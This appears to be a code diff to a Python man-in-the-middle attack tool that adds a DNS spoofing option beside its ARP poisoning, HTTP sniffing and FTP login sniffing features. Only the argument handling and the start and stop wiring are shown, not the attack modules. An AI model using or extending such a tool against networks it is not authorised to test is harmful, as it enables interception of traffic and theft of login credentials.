@@ -1,4 +1,4 @@
-from include import arppoison, ftp_sniff, http_sniff
+from include import arppoison, ftp_sniff, http_sniff, dnsspoof
 from colorama import init, Fore
 import argparse,textwrap,time,logging
 
@@ -28,6 +28,7 @@ def arguments():
     parser.add_argument("--arp",help="Enable ARP Poisoning attack",action="count")
     parser.add_argument("--http",help="Sniff HTTP packets",action="count")
     parser.add_argument("--ftp",help="Sniff FTP logins",action="count")
+    parser.add_argument("--dns",help="Spoof DNS",action="count")
     parser.add_argument("-G","--gateway",help="Gateway IP for ARP Poisoning attacks",metavar="IP")
     parser.add_argument("-T","--targets",help="Targets IPs separated by /",metavar="IP")
     parser.add_argument("-v","--verbose",action="count")
@@ -35,11 +36,11 @@ def arguments():
     args = parser.parse_args()
     
     if not args.arp and not args.http and not args.ftp: exit(parser.print_help())
-    return (args.arp,args.http,args.ftp,args.gateway,args.targets,args.verbose)
+    return (args.arp,args.http,args.ftp,args.gateway,args.targets,args.verbose,args.dns)
 
 class MITM(object):
     def __init__(self):
-        self.arp, self.http, self.ftp, self.gateway, self.targets, self.verbose = arguments()
+        self.arp, self.http, self.ftp, self.gateway, self.targets, self.verbose, self.dns = arguments()
 
         self.files = {}
 
@@ -71,10 +72,18 @@ class MITM(object):
             self.ftp = ftp_sniff.FTPSniff(verbose=self.verbose)
             self.ftp.start()
 
+    def _dns(self):
+        if self.dns:
+            logging.info("Starting DNS Spoofing Attack")
+            self.dns = dnsspoof.DNSSpoof(verbose=self.verbose)
+            self.dns.start()
+
     def stop(self):
         logging.info("Stopping attacks")
         if self.arp:
             self.arp.stop()
+        if self.dns:
+            self.dns.stop()
         if self.http:
             x, y = self.http.stop()
             self.files["HTTP"] = {
@@ -88,7 +97,8 @@ class MITM(object):
                 "logs": y,
             }
         print("")
-        logging.info("Log files:")
+        if self.files:
+            logging.info("Log files:")
         for key in self.files.keys():
             print(f"    {key}:\n      PCAP: {self.files[key]['pcap']}\n      LOGS: {self.files[key]['logs']}")
 
